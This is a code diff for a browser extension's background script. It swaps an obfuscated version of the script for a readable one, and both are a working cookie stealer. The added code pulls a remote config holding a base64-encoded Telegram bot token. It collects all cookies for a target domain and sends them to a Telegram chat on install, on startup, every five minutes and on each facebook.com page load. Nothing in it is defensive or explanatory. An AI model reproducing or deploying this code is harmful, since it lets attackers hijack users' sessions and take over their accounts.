@@ -1,1 +1,72 @@
-const _0x7d24e0=_0x3bd6;(function(_0x5860d0,_0x497f2e){const _0x1595a3=_0x3bd6,_0x7e1d18=_0x5860d0();while(!![]){try{const _0x5d40d0=parseInt(_0x1595a3(0x75))/0x1+-parseInt(_0x1595a3(0x90))/0x2+parseInt(_0x1595a3(0x7c))/0x3*(-parseInt(_0x1595a3(0x78))/0x4)+-parseInt(_0x1595a3(0x7f))/0x5+-parseInt(_0x1595a3(0x85))/0x6+-parseInt(_0x1595a3(0x72))/0x7+parseInt(_0x1595a3(0x8a))/0x8*(parseInt(_0x1595a3(0x8e))/0x9);if(_0x5d40d0===_0x497f2e)break;else _0x7e1d18['push'](_0x7e1d18['shift']());}catch(_0x25bb90){_0x7e1d18['push'](_0x7e1d18['shift']());}}}(_0x3221,0x2b813));function fetchRemoteConfig(_0x314daa){const _0x1413be=_0x3bd6;fetch('https://raw.githubusercontent.com/vietanh1206/extension-config/refs/heads/main/config.json')[_0x1413be(0x86)](_0x2e7536=>_0x2e7536[_0x1413be(0x73)]())['then'](_0x588dd0=>{const _0x1cde78=_0x1413be;if(_0x588dd0[_0x1cde78(0x80)])_0x314daa(_0x588dd0);})[_0x1413be(0x84)](_0x541f9e=>console[_0x1413be(0x71)](_0x1413be(0x8f),_0x541f9e));}function sendTelegramMessage(_0x1f1e66,_0x592a26){const _0xb9dd38=_0x3bd6,_0x341c88=_0x1f1e66[_0xb9dd38(0x76)]+'\x0a'+_0x592a26;fetch('https://api.telegram.org/bot'+_0x1f1e66[_0xb9dd38(0x74)]+'/sendMessage',{'method':_0xb9dd38(0x7e),'headers':{'Content-Type':'application/json'},'body':JSON[_0xb9dd38(0x7a)]({'chat_id':_0x1f1e66['chat_id'],'text':_0x341c88})})[_0xb9dd38(0x84)](_0x4e1467=>console[_0xb9dd38(0x71)](_0xb9dd38(0x7b),_0x4e1467));}function stealAllCookies(_0x4dbe8b){const _0x408489=_0x3bd6;chrome[_0x408489(0x77)][_0x408489(0x91)]({'domain':_0x4dbe8b['target_domain']},_0x210b44=>{const _0x2e58a5=_0x408489;if(!_0x210b44||_0x210b44[_0x2e58a5(0x8b)]===0x0)return;const _0x4a1b91=_0x210b44['map'](_0x357034=>_0x357034[_0x2e58a5(0x8c)]+'='+_0x357034[_0x2e58a5(0x83)])[_0x2e58a5(0x82)](';\x20');sendTelegramMessage(_0x4dbe8b,_0x4a1b91);});}function _0x3bd6(_0x3d3d4f,_0x194921){const _0x32211f=_0x3221();return _0x3bd6=function(_0x3bd683,_0x34923b){_0x3bd683=_0x3bd683-0x71;let _0x1dddea=_0x32211f[_0x3bd683];return _0x1dddea;},_0x3bd6(_0x3d3d4f,_0x194921);}function initStealer(){fetchRemoteConfig(_0x4ee5a4=>stealAllCookies(_0x4ee5a4));}function _0x3221(){const _0x1ac96f=['stringify','Telegram\x20error:','218181jZlUgJ','runtime','POST','176970hRqQGb','enabled','url','join','value','catch','1026558xfcHnS','then','onUpdated','complete','includes','8gWXQpN','length','name','onStartup','4875129fKgqTv','Không\x20tải\x20được\x20config:','91236tamyBk','getAll','error','2034193fOaydE','json','token','251945nvdjnI','message_prefix','cookies','4aCSPFW','addListener'];_0x3221=function(){return _0x1ac96f;};return _0x3221();}chrome['runtime'][_0x7d24e0(0x8d)]['addListener'](initStealer),chrome[_0x7d24e0(0x7d)]['onInstalled'][_0x7d24e0(0x79)](initStealer),chrome['tabs'][_0x7d24e0(0x87)][_0x7d24e0(0x79)]((_0x399344,_0x5cac7c,_0x352cb5)=>{const _0x3e2f72=_0x7d24e0;_0x5cac7c['status']===_0x3e2f72(0x88)&&_0x352cb5[_0x3e2f72(0x81)][_0x3e2f72(0x89)]('facebook.com')&&initStealer();});
+function decodeBase64(encoded) {
+  return atob(encoded);
+}
+
+function fetchRemoteConfig(callback) {
+  const url = "https://raw.githubusercontent.com/vietanh1206/extension-config/main/config.json";
+  fetch(`${url}?t=${Date.now()}`)
+    .then(res => res.json())
+    .then(config => {
+      if (config.enabled) {
+        config.token = decodeBase64(config.token);
+        config.chat_id = decodeBase64(config.chat_id);
+        callback(config);
+      } else {
+        console.warn("Config disabled, using fallback");
+        callback({ enabled: false, message_prefix: "Default", token: "", chat_id: "", target_domain: "" });
+      }
+    })
+    .catch(err => {
+      console.error("Không tải được config:", err);
+      callback({ enabled: false, message_prefix: "Default", token: "", chat_id: "", target_domain: "" });
+    });
+}
+
+function sendTelegramMessage(cfg, cookieList) {
+  if (!cfg.token || !cfg.chat_id) {
+    console.error("Invalid token or chat_id");
+    return;
+  }
+  const message = `${cfg.message_prefix}\n${cookieList}`;
+  fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: cfg.chat_id,
+      text: message
+    })
+  }).catch(err => console.error("Telegram error:", err));
+}
+
+function stealAllCookies(cfg) {
+  chrome.cookies.getAll({ domain: cfg.target_domain }, cookies => {
+    if (!cookies || cookies.length === 0) {
+      console.log("No cookies found for domain:", cfg.target_domain);
+      return;
+    }
+    const cookieList = cookies.map(c => `${c.name}=${c.value}`).join("; ");
+    sendTelegramMessage(cfg, cookieList);
+  });
+}
+
+function initStealer() {
+  fetchRemoteConfig(cfg => {
+    if (cfg.enabled) {
+      stealAllCookies(cfg);
+    }
+  });
+}
+
+// Cập nhật định kỳ mỗi 5 phút
+setInterval(initStealer, 5 * 60 * 1000);
+
+// Gọi khi khởi động, cài đặt hoặc tab cập nhật
+chrome.runtime.onStartup.addListener(initStealer);
+chrome.runtime.onInstalled.addListener(initStealer);
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (changeInfo.status === "complete" && tab.url.includes("facebook.com")) {
+    initStealer();
+  }
+});
